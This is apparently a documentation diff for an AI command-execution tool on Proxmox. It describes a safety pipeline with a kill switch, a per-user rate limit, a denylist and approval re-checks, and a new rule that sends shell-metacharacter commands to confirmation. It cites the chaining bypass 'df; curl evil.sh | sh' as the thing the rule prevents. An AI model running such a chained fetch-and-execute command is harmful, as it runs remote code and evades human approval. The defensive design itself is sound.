@@ -15,13 +15,15 @@ pct exec 130 -- systemctl restart proxmox-ai
 ## Decision pipeline
 
 Every proposed command goes through `check_execution()` in this exact order.
-The first matching rule wins:
+The first matching rule wins. **The same check runs twice**: once when the
+request is created, and again at execution time — so tightening a setting or
+flipping the kill switch immediately blocks pending approvals.
 
 | # | Check | Result |
 |---|-------|--------|
 | 1 | Kill switch (`/etc/proxmox-ai/DISABLED` exists) | **blocked** |
 | 2 | `server_access` master switch off | **blocked** |
-| 3 | Rate limit (`max_commands_per_minute`, default 10) | **blocked** |
+| 3 | Rate limit (`max_commands_per_minute`, default 10, **per user**) | **blocked** |
 | 4 | Command matches the **denylist** | **confirm** — always, even in `auto` mode |
 | 5 | Category is `guest_exec` and the guest-exec toggle is off | **blocked** |
 | 6 | Category mode is `off` | **blocked** |
@@ -89,6 +91,10 @@ Guidelines:
 
 - Patterns are matched with `re.search` against the stripped command —
   anchor with `^` to match from the start.
+- **Commands containing shell metacharacters are never allowlist-auto-run**:
+  `;`, `|`, `&`, backticks, `$(...)`, `${...}`, `<`, `>`, or newlines cause an
+  immediate fallthrough to `confirm`. This prevents chaining bypasses like
+  `df; curl evil.sh | sh`.
 - Keep the allowlist **read-only**. Anything state-changing belongs in a
   category set to `confirm`.
 - The denylist wins over the allowlist — a command matching both still
